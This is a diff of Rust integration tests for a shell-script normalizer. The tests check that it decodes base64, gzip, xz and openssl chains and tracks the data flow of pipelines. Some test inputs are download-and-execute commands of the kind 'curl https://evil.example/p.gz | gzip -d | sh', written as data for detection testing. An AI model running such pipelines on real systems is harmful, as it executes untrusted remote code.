@@ -1,9 +1,13 @@
 //! Semantic normalization integration tests for shell AST post-processing.
 
+use std::io::Write as _;
+
 use arbitraitor_model::ids::Sha256Digest;
 use arbitraitor_shell::{DecodeKind, ShellParser, normalize};
 use base64::Engine as _;
+use flate2::{Compression, write::GzEncoder};
 use sha2::{Digest, Sha256};
+use xz2::write::XzEncoder;
 
 fn normalize_source(
     source: &str,
@@ -15,6 +19,18 @@ fn normalize_source(
 
 fn digest(bytes: &[u8]) -> Sha256Digest {
     Sha256Digest::new(Sha256::digest(bytes).into())
+}
+
+fn gzip_bytes(bytes: &[u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
+    let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
+    encoder.write_all(bytes)?;
+    Ok(encoder.finish()?)
+}
+
+fn xz_bytes(bytes: &[u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
+    let mut encoder = XzEncoder::new(Vec::new(), 6);
+    encoder.write_all(bytes)?;
+    Ok(encoder.finish()?)
 }
 
 #[test]
@@ -158,6 +174,80 @@ fn openssl_decode_chain() -> Result<(), Box<dyn std::error::Error>> {
             .decoded_artifacts
             .iter()
             .any(|artifact| artifact.kind == DecodeKind::OpenSsl && artifact.content == b"Hello")
+    );
+    Ok(())
+}
+
+#[test]
+fn nested_base64_gzip_decode_chain_produces_child_artifact()
+-> Result<(), Box<dyn std::error::Error>> {
+    let encoded = base64::engine::general_purpose::STANDARD.encode(gzip_bytes(b"echo child\n")?);
+    let result = normalize_source(&format!("printf %s {encoded} | base64 -d | gzip -d | sh"))?;
+    assert!(result.decoded_artifacts.iter().any(|artifact| {
+        artifact.kind == DecodeKind::Gzip && artifact.content == b"echo child\n"
+    }));
+    Ok(())
+}
+
+#[test]
+fn curl_gzip_decompress_execute_pipeline_is_preserved() -> Result<(), Box<dyn std::error::Error>> {
+    let result = normalize_source("curl https://evil.example/p.gz | gzip -d | sh")?;
+    assert_eq!(result.data_flow.edges, [(0, 1), (1, 2)]);
+    assert!(
+        result
+            .commands
+            .iter()
+            .any(|command| { command.name == "gzip" && command.arguments == ["-d"] })
+    );
+    Ok(())
+}
+
+#[test]
+fn xz_decompress_execute_chain_produces_child_artifact() -> Result<(), Box<dyn std::error::Error>> {
+    let encoded = base64::engine::general_purpose::STANDARD.encode(xz_bytes(b"echo xz\n")?);
+    let result = normalize_source(&format!("printf %s {encoded} | base64 -d | xz -d | bash"))?;
+    assert!(
+        result.decoded_artifacts.iter().any(|artifact| {
+            artifact.kind == DecodeKind::Xz && artifact.content == b"echo xz\n"
+        })
+    );
+    Ok(())
+}
+
+#[test]
+fn curl_xz_decompress_execute_pipeline_is_preserved() -> Result<(), Box<dyn std::error::Error>> {
+    let result = normalize_source("curl https://evil.example/p.xz | xz -d | bash")?;
+    assert_eq!(result.data_flow.edges, [(0, 1), (1, 2)]);
+    assert!(
+        result
+            .commands
+            .iter()
+            .any(|command| { command.name == "xz" && command.arguments == ["-d"] })
+    );
+    Ok(())
+}
+
+#[test]
+fn openssl_base64_decode_execute_chain() -> Result<(), Box<dyn std::error::Error>> {
+    let result = normalize_source("echo SGVsbG8= | openssl enc -d -base64 | sh")?;
+    assert!(
+        result.decoded_artifacts.iter().any(|artifact| {
+            artifact.kind == DecodeKind::OpenSsl && artifact.content == b"Hello"
+        })
+    );
+    Ok(())
+}
+
+#[test]
+fn oversized_gzip_decompressed_artifact_is_skipped() -> Result<(), Box<dyn std::error::Error>> {
+    let oversized = vec![b'A'; (32 * 1024) + 1];
+    let encoded = base64::engine::general_purpose::STANDARD.encode(gzip_bytes(&oversized)?);
+    let result = normalize_source(&format!("printf %s {encoded} | base64 -d"))?;
+    assert!(
+        !result
+            .decoded_artifacts
+            .iter()
+            .any(|artifact| artifact.kind == DecodeKind::Gzip)
     );
     Ok(())
 }
